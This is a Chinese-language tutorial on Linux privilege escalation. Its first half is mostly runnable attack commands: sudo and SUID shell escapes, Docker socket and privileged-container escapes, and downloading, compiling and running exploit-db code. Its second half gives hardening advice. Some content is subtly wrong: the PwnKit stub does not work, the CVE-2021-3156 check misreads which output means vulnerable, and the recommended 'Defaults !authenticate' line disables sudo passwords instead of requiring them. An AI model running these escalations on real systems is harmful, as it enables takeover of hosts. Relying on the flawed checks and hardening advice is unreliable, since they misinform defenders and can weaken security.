# 权限提升

普通用户的权限，能变成 root 吗？

权限提升（Privilege Escalation）是攻击者在获得初始 foothold 后，进一步扩大控制权的过程。攻击者可能从一个普通用户账户出发，通过漏洞利用或配置错误，最终获得系统的完全控制权。这个过程往往是攻击链中最关键的一环。

## 权限提升类型

### 水平越权 vs 垂直越权

| 类型 | 说明 | 示例 |
|---|---|---|
| 水平越权 | 同级别权限用户之间的资源访问 | 用户 A 访问用户 B 的文件 |
| 垂直越权 | 低权限用户获得高权限操作 | 普通用户执行管理员命令 |

### 本地提权 vs 远程提权

| 类型 | 说明 |
|---|---|
| 本地提权 | 攻击者已在目标系统有 foothold，通过漏洞提升权限 |
| 远程提权 | 远程攻击者直接获取高权限（较少见） |

## 本地提权向量

### 1. Sudo 配置错误

```bash
# 查看当前用户的 sudo 权限
sudo -l

# 输出示例：
# User user may run the following commands on this host:
#     (ALL : ALL) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /usr/bin/find

# 利用 vim 提权
sudo vim -c ':!/bin/sh'
# vim 以 root 权限运行，执行 shell 获得 root shell

# 利用 find 提权
sudo find . -exec /bin/sh -p \; -quit

# 利用 Python 提权
sudo python -c 'import os; os.system("/bin/sh")'
```

### 2. SUID/SGID 提权

```bash
# 查找具有 SUID 权限的程序
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# 常见的可提权 SUID 程序
# nmap (旧版本): nmap --interactive -> !sh
# bash: bash -p
# less/more: !sh
# git: !sh
# vim: :shell 或 :!/bin/sh

# 利用 less 提权
sudo less /etc/passwd
# 在 less 中按 ! 进入 shell
!/bin/sh

# 利用 vim 提权
sudo vim -c ':!/bin/sh'
```

### 3. 内核漏洞

```bash
# 查看内核版本
uname -r
cat /etc/os-release

# 检查已知漏洞
searchsploit "Linux kernel 5.4"
# 或使用 linux-exploit-suggester

# 下载并编译漏洞
wget https://exploit-db.com/exploits/xxxxx.c
gcc xxxxx.c -o exploit
./exploit
```

### 4. 服务配置错误

```bash
# 检查以 root 运行的服务
ps aux | grep root
systemctl list-units --type=service --state=running

# 检查可写的系统服务
ls -la /etc/systemd/system/
# 如果可以修改服务配置，可以创建恶意服务

# 检查 cron 任务
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
```

### 5. Docker 容器逃逸

```bash
# 检查是否在容器中
cat /proc/1/cgroup
# 或
docker ps

# Docker Socket 逃逸
# 如果容器挂载了 /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh

# 特权容器逃逸
# 如果容器以 --privileged 运行
fdisk -l  # 检查磁盘
mkdir /tmp/c
mount /dev/sda1 /tmp/c
chroot /tmp/c
# 直接获得宿主机 root
```

### Sudo 缓冲区溢出（CVE-2021-3156）

```bash
# Baron Samedit - sudo 堆缓冲区溢出
# 影响 Sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1

# 检测漏洞
sudoedit -s '\' $(python3 -c 'print("A"*100000)')

# 如果返回 "sudoedit: ... editing files in sudoers is not allowed"
# 说明漏洞存在

# 利用（使用已有 EXP）
wget https://exploit-db.com/exploits/xxxxx.c
gcc xxxxx.c -o exploit
./exploit
```

### Polkit 权限提升（CVE-2021-4034）

```c
// pkexec 本地提权
// PwnKit - polkit 本地提权漏洞

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char *envp[] = {
        "EDITOR=/bin/sh",
        NULL
    };
    execve("/usr/bin/pkexec", argv, envp);
    return 0;
}
```

## 提权防御策略

### 系统配置

```bash
# 1. 最小权限安装
# 安装时选择最小化安装，避免不必要的服务

# 2. 及时打补丁
apt update && apt upgrade -y
yum update -y

# 3. 内核参数加固
cat >> /etc/sysctl.conf << EOF
# 禁止 core dump
kernel.core_pattern = |/bin/false
# 禁止执行 SUID 程序中的敏感操作
fs.suid_dumpable = 0
EOF

sysctl -p
```

### Sudo 配置

```bash
# /etc/sudoers 配置最佳实践

# 1. 禁止密码-less sudo
Defaults !authenticate

# 2. 限制可用的命令
username ALL=(ALL) /usr/bin/systemctl status, /usr/bin/journalctl

# 3. 使用 NOPASSWD 时限制命令
username ALL=(ALL) NOPASSWD: /usr/bin/systemctl start, /usr/bin/systemctl stop

# 4. 禁止危险的 sudo 规则
Cmnd_Alias DANGEROUS = /bin/bash, /bin/sh, /bin/nano, /bin/vi
username ALL=(ALL) !DANGEROUS
```

### 文件权限

```bash
# 查找 SUID 文件
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# 移除不必要的 SUID
chmod -s /usr/bin/newgrp
chmod -s /usr/bin/gpasswd
chmod -s /usr/bin/pkexec

# 限制 /etc/passwd 和 /etc/shadow 权限
chmod 644 /etc/passwd
chmod 000 /etc/shadow

# 禁止用户修改 cron
chattr +i /etc/crontab
chattr +i /etc/cron.d/
```

### Docker 安全配置

```yaml
# docker-compose.yml 安全配置
version: '3.8'
services:
  app:
    image: myapp:latest
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
    cap_drop:
      - ALL
    # 不挂载 Docker Socket
    # volumes:
    #   - /var/run/docker.sock:/var/run/docker.sock
```

```bash
# Docker 运行时安全选项
docker run --rm \
    --security-opt=no-new-privileges:true \
    --cap-drop=ALL \
    --read-only \
    --tmpfs /tmp \
    myapp:latest
```

### 监控与审计

```bash
# 启用审计日志
auditctl -w /etc/passwd -p wa -k passwd_modify
auditctl -w /etc/shadow -p wa -k shadow_modify
auditctl -w /usr/bin/sudo -p x -k sudo_exec

# 查看审计日志
ausearch -k passwd_modify
ausearch -k sudo_exec

# 监控新进程
auditctl -a always,exit -F arch=b64 -S execve
ausearch -sc execve
```

## 容器提权检测

```bash
# 检查容器特权模式
cat /proc/self/status | grep Cap
# 如果 CapEff 显示 000000ffffffffff 说明是特权容器

# 检查 cgroup
cat /proc/1/cgroup
# 如果看到 dockerd 或 containerd 进程在 cgroup 外，说明是特权容器

# 检查挂载
mount | grep /dev
df -h
```
